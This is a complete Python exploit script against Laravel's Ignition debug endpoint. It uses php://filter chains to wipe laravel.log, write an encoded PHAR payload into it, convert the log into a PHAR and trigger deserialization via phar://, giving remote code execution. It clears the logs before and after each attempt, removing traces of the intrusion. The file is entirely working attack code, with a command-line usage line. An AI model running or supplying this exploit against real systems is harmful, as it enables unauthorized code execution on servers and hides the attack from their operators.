import re
import sys
from requests import Session
from base64 import b64encode

class Log:
    def info(msg):
        print(f'[\33[34m\33[1m*\33[0m] {msg}')

    def success(msg):
        print(f'[\33[32m\33[1m+\33[0m] {msg}')

    def error(msg):
        print(f'[\33[41m\33[1mERROR\33[0m] {msg}')
        exit()

class Exploit:
    def __init__(self, url, phar):
        self.session = Session()
        self.url = url.rstrip('/')
        with open(phar, 'rb') as f:
            self.phar = f.read()

    def run_wrapper(self, wrapper):
        r = self.session.post(
            self.url + '/_ignition/execute-solution',
            headers={
                'Accept': 'application/json'
            },
            json={
                'solution': 'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
                'parameters': {
                    'variableName': '$name',
                    'viewFile': wrapper
                }
            }
        )
        return r

    def get_log_path(self):
        r = self.run_wrapper('NONEXISTFILE')
        full_path = r.json()['file']

        if not full_path:
            Log.error('Unable to find full path!')

        path = f'{full_path[:full_path.index("/vendor/")]}/storage/logs/laravel.log'
        r = self.run_wrapper(path)
        
        if r.status_code == 200:
            Log.success(f'Log file : {path}')
        else:
            Log.error(f'Log file does not exist: {path}')

        return path

    def clear_logs(self):
        r = self.run_wrapper(f'php://filter/read=consumed/resource={self.log_path}')
        if r.status_code == 200:
            Log.success('Logs cleared!')
        else:
            Log.error('Failed to clear logs!')

    def generate_payload(self, padding_head, padding_tail):
        payload = b64encode(self.phar).rstrip(b'=').decode('utf-8').encode('utf-16le').replace(b'\x00', b'=00')
        if padding_head:
            payload = b'A' + payload
        if padding_tail:
            payload += b'A'
        return payload

    def put_payload(self):
        self.run_wrapper('AA')  # This garanties the total log size is even
        self.run_wrapper(self.payload.decode())

    def convert_to_phar(self):
        r = self.run_wrapper(f'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={self.log_path}')
        if r.status_code == 200:
            Log.success('Successfully converted to PHAR!')
        else:
            Log.error('Convertion to PHAR failed!')

    def trigger_phar(self):
        r = self.run_wrapper(f'phar://{self.log_path}')
        Log.success('PHAR triggered!')
        Log.success('Response: ' + re.search('(.*){\s*"message"', r.text, re.DOTALL | re.MULTILINE).group(1))

    def run(self):
        self.log_path = self.get_log_path()
        for padding_head in range(2):
            for padding_tail in range(2):
                try:
                    print('â”€' * 40)
                    Log.info(f'Padding head: {padding_head == 1}, Padding tail: {padding_tail == 1}')
                    self.clear_logs()
                    self.payload = self.generate_payload(padding_head, padding_tail)
                    self.put_payload()
                    self.convert_to_phar()
                    self.trigger_phar()
                finally:
                    self.clear_logs()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        Log.error('Usage: python3 exploit.py <url> <PHAR payload>')

    exp = Exploit(sys.argv[1], sys.argv[2])
    exp.run()